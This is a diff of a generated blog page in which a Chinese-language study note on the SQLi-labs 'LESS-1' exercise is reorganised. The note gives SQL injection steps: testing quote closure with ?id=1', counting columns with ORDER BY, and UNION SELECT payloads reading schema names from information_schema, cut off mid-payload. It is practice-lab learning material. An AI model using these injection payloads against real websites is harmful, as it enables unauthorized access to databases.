@@ -451,20 +451,30 @@ c
       <div class="post-meta">
         <span><span class="icon-calendar"></span>2025-10-13</span>
         
-        <span><span class="icon-pencil"></span>432 words</span>
+        <span><span class="icon-pencil"></span>558 words</span>
         <span><span class="icon-clock"></span>3 mins</span>
       </div>
       <h2 class="post-title">SQL</h2>
       <article class="post-article">
         
-          LESS-1
+          LESS-1 （get型）
 
+寻找注入点
 发送get请求，?id&amp;#x3D;1,正常输出用户名和密码
-?id&amp;#x3D;1’报错
-?id&amp;#x3D;-1’ or 1&amp;#x3D;1–+正常输出，存在注入点(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)
-判断列数，?id&amp;#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列
-查回显，?id&amp;#x3D;-1’ union select 1,2,3;–+ 发现2和3的位置可以显示
-查库名，?id&amp;#x3D;-1’ union select 1,2,group_concat(schema_name) from information_sch
+
+
+判断闭合方式
+?id&amp;#x3D;1’报错（语法错误）
+?id&amp;#x3D;-1’ or 1&amp;#x3D;1–+正常输出(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)
+
+
+判断列数
+?id&amp;#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列
+
+
+联合查询
+查回显，?id&amp;#x3D;-1’ union select 1,2,3;–+ 发现2和3的位置可以显示（id要改成不存在的，才能确定回显）
+查库名，?id&amp;#x3D;-1’ union select 1
         
       </article>
     </div>
@@ -673,7 +683,7 @@ Run server1$ hexo ser
     
       <div>
         <span class="icon-brush"></span>
-        3.6k
+        3.7k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
         00:20
